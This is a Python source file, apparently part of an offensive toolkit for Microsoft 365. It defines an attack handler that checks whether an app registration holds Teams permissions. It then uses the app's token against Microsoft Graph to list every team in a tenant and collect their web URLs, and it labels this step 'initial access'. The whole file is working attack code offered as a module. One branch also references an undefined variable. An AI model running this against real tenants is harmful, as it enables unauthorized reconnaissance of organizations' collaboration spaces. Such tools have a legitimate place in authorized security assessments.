from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.team_settings_handler')


class TeamSettings_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if ("TeamSettings.ReadWrite.All" in request.roles) or ("Team.ReadBasic.All" in request.roles):
            logger.info('tid: %s, appid: %s may be vulnerable to team_setting_basic_rw vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "TeamSettingsBasicRWVectors"
            message = ""
            error = "TeamSettingsBasicRWVectors - failed"
            conf = request.attack_config['TeamSettings']
            if "TeamSettings.ReadWrite.All" in request.roles:
                logger.debug("TeamSettings.ReadWrite.All - Read and change all teams' settings, without a signed user.")
            if "Team.ReadBasic.All" in request.roles:
                logger.debug("Team.ReadBasic.All - Get a list of all teams, without a signed-in user.")
            logger.debug("Attack vector - initial access.")
            try:
                if len(conf['teamNames']) == 0:
                    create_message_URL = "https://graph.microsoft.com/beta/teams/"
                    result = requests.get(create_message_URL, headers=request.request_headers)
                    if result.status_code == 200:
                        res = result.json()
                        for channel in res["value"]:
                            create_message_URL = "https://graph.microsoft.com/beta/teams/" + channel["id"]
                            teamdata = requests.get(create_message_URL, headers=request.request_headers)
                            teamsres = teamdata.json()
                            message += "channel name: %s ,web url: %s\n" % (channel['displayName'], teamsres['webUrl'])
                            status = True


                else:
                    for team in conf["teamNames"]:
                        create_message_URL = "https://graph.microsoft.com/beta/teams/" + team
                        teamdata = requests.get(create_message_URL, headers=request_headers)
                        teamsres = teamdata.json()
                        message += "web url: %s\n" % (teamsres['webUrl'])
                        status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in team_settings_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
            
        return super().handle(request,responses)
